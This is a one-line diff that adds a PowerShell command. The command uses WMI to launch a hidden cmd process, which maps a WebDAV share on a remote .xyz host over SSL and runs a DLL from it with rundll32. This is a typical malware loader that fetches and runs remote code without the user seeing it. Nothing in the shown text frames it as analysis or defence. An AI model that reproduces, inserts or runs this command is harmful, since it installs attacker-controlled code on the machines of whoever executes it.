@@ -1,0 +1,1 @@
+$si=([wmiclass]'Win32_ProcessStartup').CreateInstance();$si.ShowWindow=0;([wmiclass]'Win32_Process').Create('cmd /c pushd \\hhgf.fagaheestedlali.xyz@SSL\42373e79-128c-45a0-b0e4-2a23b2979a6f & rundll32 we.ch,#1',$null,$si)
